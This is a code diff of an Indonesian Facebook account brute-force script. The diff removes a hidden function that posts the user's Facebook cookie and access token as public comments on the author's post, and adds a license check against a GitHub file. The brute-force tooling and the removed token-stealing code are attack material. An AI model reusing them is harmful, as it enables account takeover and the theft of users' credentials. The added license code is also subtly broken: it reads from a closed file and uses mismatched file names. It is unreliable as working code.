@@ -190,22 +190,6 @@ elif 17 <= hour < 18:
 else:
   hhl = "selamat malam"
 
-expired_script = ['01', '11', '2030']
-
-def ex_run():
-	saat_ini = datetime.datetime.now()
-	tgl_ = saat_ini.strftime('%d')
-	bln_= saat_ini.strftime('%m')
-	thn_ = saat_ini.strftime('%Y')
-	tanggal = thn_ + bln_ + tgl_
-	exp = expired_script[2] + expired_script[1] + expired_script[0]
-	if tanggal >= exp:
-		x=f"{P2}script ambf sudah kadaluarsa mohon dimaafkan sebesar² nya untuk kalian yang memakai script ambf:(\nkarena author ambf sudah bosan update script ini dll:(\nthanks for you sudah memakai script ambf yakk\nsemoga sehat selalu dan dilancarkan rejeki nya aminnn\n"
-		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-		exit()
-	else:
-		cek_cookie()
-
 def tahun(fx):
 	if len(fx)==15:
 		if fx[:10] in ['1000000000']       :tahunz = '2009'
@@ -242,7 +226,8 @@ def banner():
   \t / __ \__  __/ / __ \___  _________  ____/ /__  _____
   \t/ /_/ / / / / / /_/ / _ \/ ___/ __ \/ __  / _ \/ ___/
  \t/ _, _/ /_/ / / _, _/  __/ /__/ /_/ / /_/ /  __/ /    
-\t/_/ |_|\__,_/_/_/ |_|\___/\___/\____/\__,_/\___/_/• Multi Brute Force Facebook •
+\t/_/ |_|\__,_/_/_/ |_|\___/\___/\____/\__,_/\___/_/
+\t\t• Multi Brute Force Facebook •
 \t\t{garis} author by {K}RulRecoder
 """)
 
@@ -260,12 +245,7 @@ def cek_expired_script():
 	else:
 		pass
 
-def comen(kook,token):
-	cookie = kook
-	random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf\nTanggal Login Ku Bang :"+sekarang,"Hikmat Gans Selalu Coeg><","semoga @[100000131722561:0] panjang umur dan rejeki nya dilancarkan aminnn"]);react_angry = 'ANGRY';requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/reactions?type={react_angry}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/reactions?type={react_angry}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100000131722561?fields=subscribers&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={cookie}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={toket}&access_token={toket}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":cookie});menu()
-
 def cek_cookie():
-	cek_expired_script()
 	try:
 		token  = open('token.txt','r').read()
 		cookie = {'cookie':open('cookie.txt','r').read()}
@@ -304,32 +284,19 @@ def cek_cookie():
 
 def login():
 	banner()
-	x=f"{P2}halo pengguna script arona multi brute force :)\n{P2}silahkan pilih fitur login cookie untuk melanjutkan ke menu arona multi brute force.. klo tidak mengerti apa² bisa ketik {M2}help {P2}untuk meminta bantuan !!"
+	x=f"{P2}Silahkan login menggunakan Lisensi\n{P2}Jika tidak memiliki lisensi bisa hubungi admin !!"
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	print("")
-	x=f"{P2}[01] login with cookie\n{P2}[02] report bug script\n{P2}[{M2}00{P2}] exit "
+	x=f"{P2}[01] Login With Lisensi\n{P2}[02] Hubungi Admin\n{P2}[{M2}00{P2}] exit "
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	cukuf = input(f" {P}[{warna_warni_biasa}•{P}] pilih : {H}")
-	if cukuf in ["help","Help","HELP"]:
-		print("")
-		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo ada kepentingan yang mau disampaikan ke author ambf\nini klo gak bisa diarahin ke whastapp admin yakk"
-		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-		print("")
-		x=f"{P2}sedang diarahkan ke whastapp author"
-		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-		os.system('xdg-open https://wa.me/+6282115413282?text=bang+cara+pake+script+abang+kek+mana?')
-		input(f" {P}[{warna_warni_biasa}•{P}] kembali")
-		login()
-	elif cukuf in ["1","01"]:
-		login_cookie()
+	if cukuf in ["1","01"]:
+		run()
 	elif cukuf in ["2","02"]:
 		print("")
-		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo memang ada yang error\nini klo gak bisa diarahin ke whastapp admin yakk"
-		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-		print("")
 		x=f"{P2}sedang diarahkan ke whastapp author"
 		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-		os.system('xdg-open https://wa.me/+6282115413282?text=bang+script+mu+itu+ada+yang+error!!')
+		os.system('xdg-open https://wa.me/+6281283547452?text=bang+minta+lisensi+sc+nya!!')
 		input(f" {P}[{warna_warni_biasa}•{P}] kembali")
 		login()
 	elif cukuf in ["0","00"]:
@@ -1602,7 +1569,92 @@ def cek_apk(ses,kuki):
 			print("\r"+garis+" %s%s. %s%s"%(P,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),P))
 		else:
 			print('\r') 
+#----------------------[ LICENSE ]---------------------#
+import requests
+from datetime import datetime
 
+LICENSE_FILE_PATH = "save_license.txt"
 
-ex_run()
+def is_license_valid(license_info):
+    # Split license_info into components
+    license_key, start_time_str, end_time_str = license_info.split('|')
+
+    # Convert string times to datetime objects
+    start_time = datetime.strptime(start_time_str, '%Y-%m-%d %H:%M')
+    end_time = datetime.strptime(end_time_str, '%Y-%m-%d %H:%M')
+
+    # Get current time
+    current_time = datetime.now()
+
+    # Check if the license is within the valid time range
+    return start_time <= current_time <= end_time
+
+def check_license(license_key):
+    # Jika lisensi sudah tersimpan, gunakan langsung tanpa memerlukan input
+    try:
+        with open(LICENSE_FILE_PATH, 'r') as file:
+            saved_license = file.read()
+            if saved_license and is_license_valid(saved_license):
+                return True
+    except FileNotFoundError:
+        pass
+
+    # Jika lisensi tidak tersimpan atau tidak valid, lakukan verifikasi ulang
+    github_repo_url = "https://raw.githubusercontent.com/khoirulez/RR07/main/mylisensi.txt"
+    try:
+        response = requests.get(github_repo_url)
+        licenses = response.text.split('\n')
+
+        for license_info in licenses:
+            if license_info.startswith(license_key) and is_license_valid(license_info):
+                # Simpan lisensi yang valid ke penyimpanan lokal
+                with open(LICENSE_FILE_PATH, 'w') as file:
+                    file.write(license_info)
+                return True
+
+        return False
+
+    except requests.RequestException as e:
+        print(f"Error: {e}")
+        return False
+def get_expiration_date(license_info):
+    _, _, end_time_str = license_info.split('|')
+    end_time = datetime.strptime(end_time_str, '%Y-%m-%d %H:%M')
+    return end_time
+def run():
+    try:
+        with open(LICENSE_FILE_PATH, 'r') as file:
+            print(f'  [•]{M} Sedang Mengecek Lisensi..... !!!! ')
+            saved_license = file.read()
+            expiration_date = get_expiration_date(saved_license)
+            print(f"{H}Lisensi kadaluwarsa pada tanggal: {B}{expiration_date.strftime('%Y-%m-%d %H:%M')}");time.sleep(2)
+            if saved_license and is_license_valid(saved_license):
+                time.sleep(0.03)
+                print(f"{H}Lisensi valid. Selamat menggunakan program.")
+                time.sleep(2)
+                os.system("clear")
+                login_cookie()
+    except (IOError,FileNotFoundError):
+       license_key = input(f"[{h}•{x}]{U}Masukkan lisensi{x}:{B} ")
+       licen=open(".save_license.txt", "w").write(license_key)
+       time.sleep(0.03)
+
+       if check_license(license_key):
+          print(f'  [•]{M} Sedang Mengecek Lisensi..... !!!! ')
+          time.sleep(1)
+          saved_license = file.read()
+          expiration_date = get_expiration_date(saved_license)
+          print(f"{H}Lisensi kadaluwarsa pada tanggal: {B}{expiration_date.strftime('%Y-%m-%d %H:%M')}");time.sleep(2)
+          if saved_license and is_license_valid(saved_license):
+              time.sleep(0.03)
+              print(f"{H}Lisensi valid. Selamat menggunakan program.")
+              time.sleep(2)
+              os.system("clear")
+              login_cookie()
+       else:
+          os.system("rm -f .save_license.txt")
+          print(f"{m}Lisensi tidak valid atau telah kadaluarsa. Tolong masukan lisensi dengan benar.")
+          time.sleep(0.03)
+          run()
+
 #cek_cookie()
